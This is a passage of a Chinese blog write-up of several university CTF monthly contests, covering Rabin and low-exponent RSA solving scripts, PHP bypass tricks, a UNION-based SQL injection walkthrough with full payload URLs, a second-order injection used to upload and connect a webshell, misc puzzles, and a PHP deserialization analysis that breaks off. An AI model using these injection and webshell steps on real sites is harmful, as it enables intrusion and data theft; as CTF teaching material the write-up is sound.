class="line">c=<span class="number">499900287907163903863770127517451824950591449854220282014018552802396943304674724533357663876916175459043411887269615620980351359674373127551283923032759205525834407466303318140213222438375548066871397251493100247836770129792554768759516349058673615081761638343932256849889604058608747531941928982832585706361391950223948529046950139043176720742038526998231448270490097134641169635210567151369533018545746204046992368621334939029582400285322777365958482219075297507215203709356125635202625121091161318566582307478931230962853531285514124459092351456397307588024613094226807792165876133269038363995037219677926220967578191033480631890589761476293394613074763877465067481353073032261829035532832262390121385388328585967620567497069930361644409182632934629875953161754678971744082331335000439916510067572742641854184303838362027247026467270857712018679364014951870327424723286991989268813839644982317838329022551033151317911958707603833070206941532496854730739054206016872958750645705043270396511543390465607172543992216405734971188437702405334334961918445724163241075322921116618280425131683507843396376626705861243420399065472311770119489811395486846742327683616439776584876654620796349661745998246254486950516901889112077176621805823</span></span><br><span class="line">p=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span></span><br><span class="line">q=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ans=rabin_decrypt(c,p,q,e=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ans:</span><br><span class="line">        temp=<span class="string">'&#123;:x&#125;'</span>.format(x).decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> temp:</span><br><span class="line">            <span class="keyword">print</span> temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>攻击得到4个结果，经过筛选得到一段含有flag的有意义的明文：</p><p><img src="https://s2.ax1x.com/2019/01/16/kSbyYn.png" alt="kSbyYn.png"></p><h1 id="第二次月赛"><a href="#第二次月赛" class="headerlink" title="第二次月赛"></a>第二次月赛</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>是个easy的绕过，给出源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$white_list = range(0,9);</span><br><span class="line">require_once(&apos;flag.php&apos;);</span><br><span class="line">if(isset($_REQUEST[&apos;0ver&apos;]) &amp;&amp; isset($_REQUEST[&apos;0ver1&apos;]) &amp;&amp; isset($_REQUEST[&apos;0ver2&apos;]))&#123;</span><br><span class="line">    $a = $_REQUEST[&apos;0ver&apos;];</span><br><span class="line">    $b = $_REQUEST[&apos;0ver1&apos;];</span><br><span class="line">    $c = $_REQUEST[&apos;0ver2&apos;];</span><br><span class="line">    if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)&#123;</span><br><span class="line">        echo &apos;no must be number&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(in_array($a,$white_list))&#123;</span><br><span class="line">            if(strlen($a)&gt;1)&#123;</span><br><span class="line">                if(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123;</span><br><span class="line">                    echo &quot;&lt;img src=&apos;dark.png&apos;&gt;&lt;br&gt;&quot;;</span><br><span class="line">                    echo &apos;you are a great dark phper&lt;br&gt;&apos;;</span><br><span class="line">                    echo $flag;</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                    echo &quot;you can do it!!!&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &apos;you no dark&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;you are so dark&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>考察<code>ereg()</code>和<code>md5()</code>的绕过姿势，00截断绕过<code>ereg</code>，上传数组绕过<code>md5</code>，即可得到flag如下：</p><p><img src="https://s2.ax1x.com/2019/01/25/kmRqk8.png" alt="kmRqk8.png"></p><p><strong>payload：</strong><code>http://202.119.201.199:32790/index.php?0ver=5%00a&amp;0ver1[]=a&amp;0ver2[]=b</code></p><h3 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h3><p>是个前端验证，只允许上传图片，不允许上传php为后缀的文件，只需要bp截取改后缀名即可；</p><p><a href="https://imgchr.com/i/kMY3XF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMY3XF.md.png" alt="kMY3XF.md.png"></a></p><h3 id="小型线上赌场"><a href="#小型线上赌场" class="headerlink" title="小型线上赌场"></a>小型线上赌场</h3><p>一开始没有思路，毕竟是萌新还没有了解到CTF的很多姿势，请教大佬得知是vim文件泄露，在vim编辑的时候没有正常退出，系统就会自动生成一个swp文件用来日后的恢复；直接down下来，vim打开得源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$invest = $_GET[&apos;invest&apos;];  </span><br><span class="line">$rand = rand(2,50);  </span><br><span class="line">$len = strlen(trim($_GET[&apos;invest&apos;]));</span><br><span class="line">foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">    if(!is_numeric($value)||$value == &apos;0&apos;)&#123;</span><br><span class="line">        die(&apos;no no no!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$money = number_format($invest*$rand);</span><br><span class="line">$money = intval(str_replace(&apos;,&apos;,&apos;&apos;,$money));</span><br><span class="line">$guess = intval($_GET[&apos;guess&apos;]); </span><br><span class="line">if ($guess == $money &amp;&amp; strlen($money)===$len)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看懂源码意思即可，生成<code>2~50</code>的随机数<code>rand</code>，<code>money</code>为<code>$invest*$rand</code>；如果<code>$money==$guess</code>就回显flag，即<code>invest*倍数==guess</code>即可，那我们可以直接直接bp爆破，猜一个<code>guess</code>，固定<code>invest</code>和<code>guess</code>的值，多次爆破，如果次数达到一定的上限一定会出现猜对倍数的情况，这样的话就会输出flag；</p><p><strong>bp爆破设置：</strong></p><ol><li><p>不设置变量；</p><p><a href="https://imgchr.com/i/kMdro4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdro4.md.png" alt="kMdro4.md.png"></a></p></li><li><p>设置payload类型为<code>null payloads</code>，上限次数设置大一点为2000；</p><p><a href="https://imgchr.com/i/kMdEIH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdEIH.md.png" alt="kMdEIH.md.png"></a></p></li><li><p>随便设置一下options即可start；</p></li></ol><p><strong>结果：</strong></p><p>升序排列length即可发现不匹配的特殊项，发现flag；</p><p><a href="https://imgchr.com/i/kMdfOK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdfOK.md.png" alt="kMdfOK.md.png"></a></p><p><a href="https://imgchr.com/i/kMdqSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdqSI.md.png" alt="kMdqSI.md.png"></a></p><h3 id="SimpleSQLi"><a href="#SimpleSQLi" class="headerlink" title="SimpleSQLi"></a>SimpleSQLi</h3><ol><li>首先输入<code>?id=1%27</code>报错；</li><li>接着注释掉后面的引号<code>?id=1%27%23</code>，回显正常，说明猜测成功存在注入点；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmW7v9.png" alt="kmW7v9.png"></p><ol start="3"><li>接下来就是用order by去猜列数，<code>?id=1%27%20order%20by%203%23</code>回显正常应该是三列没错；</li><li>下面需要用union select去回显某一列的东西，构造<code>?id=-1%27%20union%20select%201,2,3%23</code>；这里需要第一句话为空才能显示后面一句话的内容，选择id=-1，就可以回显2和3，后面就可以利用这两列回显想要的东西；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmfwrR.png" alt="kmfwrR.png"></p><ol start="5"><li>爆库名：<code>?id=-1%27%20union%20select%201,2,database()%20%23</code>为<code>security</code></li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmhMWD.png" alt="kmhMWD.png"></p><ol start="6"><li>爆表名，此处使用mysql里面自带的information_schema表；<code>id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</code>发现flag表信息；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmfjLn.png" alt="kmfjLn.png"></p><ol start="7"><li>爆列名：<code>id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flagishere%27%23</code>有Id和flag两列；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmhBlQ.png" alt="kmhBlQ.png"></p><ol start="8"><li>爆值：<code>?id=-1%27%20union%20select%201,2,group_concat(Id,0x3a,flag)%20from%20flagishere%23</code></li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmh4l4.png" alt="kmh4l4.png"></p><h3 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h3><p>队友Source在离别歌的blog里搜索到类似题目，了解到这题的切入点是二次注入；直接拿来payload就可以搞定这一题；</p><ol><li><p>先选择文件进行上传，filename为<code>&#39;,extension=&#39;&#39;,filename=&#39;x.jpg.jpg</code>；<img src="https://s2.ax1x.com/2019/01/28/kM0tK0.png" alt="kM0tK0.png"></p></li><li><p>Rename file，注入后文件系统中文件名为<code>xl.jpg.jpg</code><img src="https://s2.ax1x.com/2019/01/28/kM02qK.png" alt="kM02qK.png"></p></li><li><p>上传真的包含webshell的文件；<img src="https://s2.ax1x.com/2019/01/28/kMBUSA.png" alt="kMBUSA.png"></p></li><li><p>改名后缀为<code>.php</code>，连接菜刀即可；<img src="https://s2.ax1x.com/2019/01/28/kMBrTS.png" alt="kMBrTS.png"></p></li><li><p>flag在根目录；</p><p><a href="https://imgchr.com/i/kuqufs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/27/kuqufs.md.png" alt="kuqufs.md.png"></a><a href="https://imgchr.com/i/kuq1XV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/27/kuq1XV.md.png" alt="kuq1XV.md.png"></a></p></li></ol><p>参考链接：<a href="https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html" target="_blank" rel="noopener">leavesongs的博客</a></p><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h3><p>一度以为是hash，因为base64decode出来是<code>Salted__</code>开头，真的是……被出题人虐到鼻青脸肿，和队里大佬讨论很久也不知道怎么办，还一度以为是AES，hint出来了是DES，也不知道密钥该如何解密……没想带直接找一个在线网站直接解密既可以了……密钥为空…… 狂喷一口老血……<img src="https://s2.ax1x.com/2019/01/25/km4Jc4.png" alt="km4Jc4.png"></p><p><a href="https://imgchr.com/i/km4V1g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km4V1g.md.png" alt="km4V1g.md.png"></a></p><p>在线解密一次以后再解一次即可得到flag：</p><p><a href="https://imgchr.com/i/km4buj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km4buj.md.png" alt="km4buj.md.png"></a></p><p>这就是双重DES……</p><h3 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h3><p>也是解的很暴躁的一题，基本就是大家一开始都是base32出来就不知道那是什么玩意了……</p><p><a href="https://imgchr.com/i/km5n2D" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km5n2D.md.png" alt="km5n2D.md.png"></a></p><p>翻看各种大佬的博客总结古典密码都没有这种奇怪的符号……直到队友解出来的那一刻我都是懵逼的(SourceNB)，放上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"LZYGQ326N5QXMYAKORNG42TABJ2FUWS2MNRWG6A="</span></span><br><span class="line">c=base64.b32decode(s)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> c:</span><br><span class="line">        ans+=chr((ord(x)+i)%<span class="number">128</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ctf'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure><p>在ASCII码内凯撒爆破即可：</p><p><img src="https://s2.ax1x.com/2019/01/25/km5oIx.png" alt="km5oIx.png"></p><p>慢着…这16进制是什么鬼……大胆猜测是easy_soeasy__hhh，填入果然没错……</p><p>总的来说做这两题的心情就是可以狂扁出题人小朋友了……</p><p><a href="https://imgchr.com/i/km5zdI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km5zdI.md.png" alt="km5zdI.md.png"></a></p><h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>这题终于不是前面两题那么让人流泪了……，n和c里只出现了12个字符猜测是12进制；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5</span><br><span class="line">e=5</span><br><span class="line">c=411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065</span><br></pre></td></tr></table></figure><p>给出以下信息，<code>e=5</code>，猜测是低指数攻击，上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">twl_to_dec</span><span class="params">(twl)</span>:</span></span><br><span class="line">ans=<span class="number">0</span></span><br><span class="line">l=len(twl)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line"><span class="keyword">if</span> twl[i]==<span class="string">'A'</span>:</span><br><span class="line">temp=<span class="number">10</span></span><br><span class="line"><span class="keyword">elif</span> twl[i]==<span class="string">'b'</span>:</span><br><span class="line">temp=<span class="number">11</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp=int(twl[i],<span class="number">10</span>)</span><br><span class="line">ans+=temp*pow(<span class="number">12</span>,l-i<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_msg</span><span class="params">(c,n,e)</span>:</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, e)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        x = gmpy2.iroot(c+i*n, e)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> hex(x)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">n=<span class="string">"36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5"</span></span><br><span class="line">c=<span class="string">"411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065"</span></span><br><span class="line">e=<span class="number">5</span></span><br><span class="line">n=twl_to_dec(n)</span><br><span class="line">c=twl_to_dec(c)</span><br><span class="line">small_msg(c,n,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>12进制转化为 10进制以后直接进行小公钥指数攻击即可，得到flag：</p><p><img src="https://s2.ax1x.com/2019/01/28/kM2DiV.png" alt="kM2DiV.png"></p><p><strong>友情提示：</strong>自己写的进制转换虽然丑，but肯定比网上在线转换靠谱（微笑.jpg）</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc签到"><a href="#Misc签到" class="headerlink" title="Misc签到"></a>Misc签到</h3><p>得到盲文图片如下，直接对应盲文表解出flag内容为：<code>BAIND</code>，将A换为1，加上flag提交即可；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMBHfJ.png" alt="kMBHfJ.png"></p><h3 id="BXS图标真好看"><a href="#BXS图标真好看" class="headerlink" title="BXS图标真好看"></a>BXS图标真好看</h3><p>打开是个txt文件，查看内容发现<code>IDHR</code>关键字，猜测是png图片，直接改掉后缀得到一张图片；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMDah4.png" alt="kMDah4.png"></p><p>发现flag相关内容，猜测是凯撒移位，但发现前面有8位，果断推翻猜想，继续猜测是栅栏密码，果然得到flag；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMDvgs.png" alt="kMDvgs.png"></p><h3 id="base全家桶了解一下"><a href="#base全家桶了解一下" class="headerlink" title="base全家桶了解一下"></a>base全家桶了解一下</h3><p>nctf遇到过差不多的题，没什么难度；</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"R1kzRE1RWldHRTNET04yQ0dVM1RNTkpXSU0zREdNWlFHWkNETU5KVklZM1RJTVpRR01ZREtSUldHTTNUS05TRUc0MkRNTVpYR1EzRE1OMkU="</span></span><br><span class="line">c=base64.b64decode(s)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line">d=base64.b32decode(c)</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">e=base64.b16decode(d)</span><br><span class="line"><span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/kMroRJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMroRJ.md.png" alt="kMroRJ.md.png"></a></p><h3 id="起床改error啦"><a href="#起床改error啦" class="headerlink" title="起床改error啦"></a>起床改error啦</h3><p>唯一做到的Misc……队友Source太给力……拿到手是个png图片</p><p><img src="https://s2.ax1x.com/2019/01/28/kMsCQA.jpg" alt="kMsCQA.jpg"></p><p>丢进十六进制编辑器，发现猫腻，有zip文件头和flag信息；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMsAdf.png" alt="kMsAdf.png"></p><p>扒下来另存为zip，解压得到flag.doc，但是里面没有flag；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMs3wV.png" alt="kMs3wV.png"></p><p>提示直接告诉是doc隐写，那就显示隐藏文字即可，得到flag；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMs2SH.png" alt="kMs2SH.png"></p><h1 id="第三次月赛"><a href="#第三次月赛" class="headerlink" title="第三次月赛"></a>第三次月赛</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><p>很简单的文件包含，直接<code>php://</code>协议读<code>cxk.php</code>即可；</p><h3 id="Web签到2"><a href="#Web签到2" class="headerlink" title="Web签到2"></a>Web签到2</h3><p>考察反序列化漏洞的知识，给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $var;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(</span><br><span class="line">            <span class="string">'global '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span>.</span><br><span class="line">            <span class="string">'$ret = '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $fn;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $fn = <span class="keyword">$this</span> -&gt; fn;</span><br><span class="line">        <span class="keyword">return</span> $fn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;obj-&gt;name) || <span class="keyword">$this</span>-&gt;obj-&gt;name != <span class="string">"iv4n"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; obj -&gt; fn = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> unserialize($_POST[<span class="string">'obj'</span>])-&gt;obj;</span><br></pre></td></tr></table></figure><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><blockquote><p>三个类分别是P，K，U；</p><p>P中$var，权限为private，魔术方法__invoke()，当尝试以调用函数的方式调用一个对象时， 方法会被自动调用；</p><p>K中$fn，$name，权限为protected，魔术方法__toString()，将$fn以函数方式返回$fn()；到这里就会想到上面的invoke()，那这里的$fn就肯定是P的一个对象；</p><p>U中$obj，魔术方法__wakeup()，要求<code>$this-&gt;obj-&gt;name == &quot;iv4n&quot;</code>；</p></blockquote><h4 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h4><p>想到绕过__wakeup()，但是要求可以达到，就直接new一个U的对象，将对象中的数据成员$obj赋值为一个K的对象，将此对象的<code>$name</code>赋值为<code>iv4n</code>即可，其实不算绕过(<del>手动狗头</del>)；</p><h4 id="bypass2"><a href="#bypass2" class="headerlink" title="bypass2"></a>bypass2</h4><p>接下来就是如何调用到<code>$fn</code>，这里需要注意的是变量的权限问题，这里为protected，但是在外面无法赋值，这里写个脚本做个测试：</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class run&#123;</span><br><span class="line">private $kk1=&apos;$flag&apos;;</span><br><span class="line">protected $kk2=&apos;b&apos;;</span><br><span class="line">public $kk3=&apos;c&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$gardenia1=new run();</span><br><span class="line">echo (serialize($gardenia1));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：</p><p><img 